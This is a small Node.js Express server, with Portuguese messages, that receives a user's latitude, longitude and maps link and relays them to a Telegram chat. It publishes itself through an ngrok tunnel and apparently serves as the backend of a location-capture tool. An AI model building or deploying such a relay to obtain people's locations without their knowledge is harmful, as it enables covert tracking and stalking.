const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");
require("dotenv").config();
const ngrok = require("ngrok");

const app = express();
app.use(cors());
app.use(bodyParser.json());

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const PORT = 8088;

app.post("/send-location", async (req, res) => {
  const { latitude, longitude, maps } = req.body;

  const message = `📍 Localização do usuário:\nLatitude: ${latitude}\nLongitude: ${longitude}\nMaps: ${maps}`;

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });

    res.status(200).json({ success: true });
  } catch (error) {
    console.error("Erro ao enviar mensagem para o Telegram:", error.message);
    res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
  }
});

app.listen(PORT, async () => {
  console.log(`🚀 Servidor rodando localmente na porta ${PORT}`);

  try {
    const url = await ngrok.connect(PORT);
    console.log(`🌍 NGROK está expondo a aplicação em: ${url}`);
  } catch (err) {
    console.error("Erro ao iniciar o ngrok:", err.message);
  }
});
